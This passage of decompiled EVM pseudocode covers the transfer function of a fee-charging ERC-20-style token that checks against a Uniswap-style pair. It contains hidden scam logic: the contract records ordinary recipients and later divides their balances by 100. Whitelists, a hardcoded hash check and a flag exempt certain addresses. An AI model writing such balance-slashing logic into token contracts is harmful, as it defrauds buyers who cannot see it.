                               args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if ext_call.return_data[12 len 20] == arg1:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2,
                                          mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                        stor15.length++
                        stor15[stor15.length].field_0 = arg1
                        stor15[stor15.length].field_256 = arg2
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                      arg2,
                                      mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                      msg.sender,
                                      arg1,
                    else:
                        if arg2 and _fee > -1 / arg2:
                            revert with 'NH{q', 17
                        if not arg2:
                            revert with 'NH{q', 18
                        if arg2 * _fee / arg2 != _fee:
                            revert with 0, 'SafeMath: multiplication overflow'
                        require arg2 <= _maxTxAmount
                        require ext_code.size(stor16)
                        staticcall stor16.factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor16)
                        staticcall stor16.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[(15 * ceil32(return_data.size)) + 268] = this.address
                        mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if ext_call.return_data[12 len 20] == arg1:
                            if arg2 < arg2 * _fee / 100:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[0] += arg2 * _fee / 100
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 - (arg2 * _fee / 100),
                                          mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            if arg2 * _fee / 100 > 0:
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 * _fee / 100,
                                              mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              0,
                            return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                        stor15.length++
                        stor15[stor15.length].field_0 = arg1
                        stor15[stor15.length].field_256 = arg2
                        if arg2 < arg2 * _fee / 100:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                            revert with 'NH{q', 17
                        balanceOf[0] += arg2 * _fee / 100
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                      arg2 - (arg2 * _fee / 100),
                                      mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                      msg.sender,
                                      arg1,
                        if arg2 * _fee / 100 > 0:
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 * _fee / 100,
                                          mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          0,
                    return 1, mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)]
                idx = 0
                while idx < stor15.length:
                    mem[0] = stor15[idx].field_0
                    mem[32] = 3
                    _642 = mem[64]
                    mem[64] = mem[64] + 64
                    mem[_642] = 26
                    mem[_642 + 32] = 'SafeMath: division by zero'
                    if idx >= stor15.length:
                        revert with 'NH{q', 50
                    mem[0] = stor15[idx].field_0
                    mem[32] = 3
                    balanceOf[stor15[idx].field_0] = balanceOf[stor15[idx].field_0] / 100
                    if idx == -1:
                        revert with 'NH{q', 17
                    idx = idx + 1
                    continue 
                stor15.length = 0
                mem[0] = 15
                idx = 0
                while 2 * stor15.length > idx:
                    stor15[idx].field_0 = 0
                    stor15[idx].field_256 = 0
                    idx = idx + 2
                    continue 
                require ext_code.size(stor16)
                staticcall stor16.factory() with:
                        gas gas_remaining wei
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _7007 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _7018 = mem[_7007]
                require mem[_7007] == mem[_7007 + 12 len 20]
                require ext_code.size(stor16)
                staticcall stor16.WETH() with:
                        gas gas_remaining wei
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _7036 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _7042 = mem[_7036]
                require mem[_7036] == mem[_7036 + 12 len 20]
                mem[mem[64] + 4] = this.address
                mem[mem[64] + 36] = address(_7042)
                require ext_code.size(address(_7018))
                staticcall address(_7018).getPair(address arg1, address arg2) with:
                        gas gas_remaining wei
                       args address(this.address), address(_7042)
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _7060 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                require mem[_7060] == mem[_7060 + 12 len 20]
                if arg1 != mem[_7060 + 12 len 20]:
                    require ext_code.size(stor16)
                    staticcall stor16.factory() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7114 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7132 = mem[_7114]
                    require mem[_7114] == mem[_7114 + 12 len 20]
                    require ext_code.size(stor16)
                    staticcall stor16.WETH() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7180 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7210 = mem[_7180]
                    require mem[_7180] == mem[_7180 + 12 len 20]
                    mem[mem[64] + 4] = this.address
                    mem[mem[64] + 36] = address(_7210)
                    require ext_code.size(address(_7132))
                    staticcall address(_7132).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(_7210)
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7362 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7429 = mem[_7362]
                    require mem[_7362] == mem[_7362 + 12 len 20]
                    if mem[_7362 + 12 len 20] != msg.sender:
                        if stor6[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 6
                            if stor6[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _7795 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if sha3(mem[_7795 + 32 len mem[_7795]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 == this.address:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if msg.sender == address(_7429):
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor14:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor15.length++
                                                        stor15[stor15.length].field_0 = arg1
                                                        stor15[stor15.length].field_256 = arg2
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 'NH{q', 17
                                                    if not arg2:
                                                        revert with 'NH{q', 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor15.length++
                                                        stor15[stor15.length].field_0 = arg1
                                                        stor15[stor15.length].field_256 = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100 > 0:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        if stor6[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 6
                            if stor6[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _7821 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if sha3(mem[_7821 + 32 len mem[_7821]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 == this.address:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor6[address(arg1)]:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor14:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor15.length++
                                                        stor15[stor15.length].field_0 = arg1
                                                        stor15[stor15.length].field_256 = arg2
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 'NH{q', 17
                                                    if not arg2:
                                                        revert with 'NH{q', 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor15.length++
                                                        stor15[stor15.length].field_0 = arg1
                                                        stor15[stor15.length].field_256 = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100 > 0:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                else:
                    mem[0] = msg.sender
                    mem[32] = 6
                    if stor6[address(msg.sender)]:
                        if stor6[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 6
                            if stor6[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _7194 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if sha3(mem[_7194 + 32 len mem[_7194]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 == this.address:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor6[address(msg.sender)]:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor14:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor15.length++
                                                        stor15[stor15.length].field_0 = arg1
                                                        stor15[stor15.length].field_256 = arg2
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 'NH{q', 17
                                                    if not arg2:
                                                        revert with 'NH{q', 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor15.length++
                                                        stor15[stor15.length].field_0 = arg1
                                                        stor15[stor15.length].field_256 = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100 > 0:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        require ext_code.size(stor16)
                        staticcall stor16.factory() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7120 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7138 = mem[_7120]
